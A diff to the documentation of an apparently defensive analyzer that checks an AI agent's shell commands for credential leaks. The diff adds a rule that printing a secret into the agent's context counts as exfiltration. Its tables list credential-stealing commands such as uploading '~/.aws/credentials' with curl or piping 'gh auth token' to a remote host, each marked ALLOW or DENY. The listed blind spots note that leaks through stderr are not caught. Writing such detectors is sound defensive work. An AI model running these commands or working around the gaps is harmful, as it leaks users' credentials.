@@ -193,6 +193,7 @@ authenticated API call ever made.
 | `content` | `gh issue comment --body "$TOKEN"` | exposed — transmitted as payload |
 | `file` | `curl -d @<(cat ~/.aws/credentials)` | exposed — contents uploaded |
 | `disk` | `echo "$TOKEN" > /tmp/leak` | exposed — written to disk |
+| `stdout` | `cat ~/.aws/credentials` | exposed — printed where the caller reads it |
 
 A slot is not always fixed. `curl -H` is an `auth` slot when the header is an
 authentication header and a `content` slot when it is not, because
@@ -380,6 +381,36 @@ Two flags are left out on purpose. `sed -i` is a switch on GNU sed and takes a
 suffix on BSD sed; an ambiguous arity is a real gap, so it denies rather than
 being guessed at. `xargs` and `timeout` are absent as programs for the same
 reason — they run something else that the analyzer does not descend into.
+
+### Printing is exfiltration too
+
+The output of an assessed command goes back to whoever ran it. When that is an
+agent, it lands in the model's context — its reasoning, its next tool call,
+the transcript, wherever that transcript is stored. So a command that prints a
+credential exfiltrates it just as surely as one that posts it; it just uses
+the agent as the transport.
+
+```
+gh auth token                        DENY   printed straight to the caller
+cat ~/.aws/credentials               DENY   same
+env | grep GITHUB                    DENY   filtered, still printed
+echo "data: $(gh auth token)"        DENY
+
+TOKEN=$(gh auth token)               ALLOW  captured, not printed
+gh auth token > /dev/null            ALLOW  discarded
+printenv GH_TOKEN | wc -c            ALLOW  reduced to a count
+gh auth token | curl -d @- https://x DENY   but as a network leak, not this one
+```
+
+Only data the analyzer identified as sensitive counts here. Ordinary output is
+what every command produces, so unlike a network slot this one does **not**
+deny on unknown provenance — `ls -la` and `git log` are unaffected.
+
+Two parameter expansions are excluded because they never yield the value they
+name: `${#VAR}` is a length, and `${VAR:+yes}` substitutes a fixed word. Both
+are how you probe for a credential *without* printing one, and flagging them
+would flag careful code for being careful. `${VAR:-fallback}` still counts,
+because it can expand to the value.
 
 ### Sources
 
@@ -610,6 +641,9 @@ than one that has none.
   known exfiltration, so no precision or recall number is offered. The test
   suite checks that specific flows are traced correctly; it does not measure
   how often the tool is right in the wild.
+- **Only stdout, not stderr.** A command that writes a secret to stderr is not
+  caught. The analyzer tracks stdout through pipes, substitutions and
+  redirects; stderr has none of that plumbing modelled.
 - **Not a sandbox.** Static analysis of a command string cannot see what a
   program does at runtime, and the hardest case has no dataflow edge at all:
   an agent reads a config file, then pastes the secret into a request as
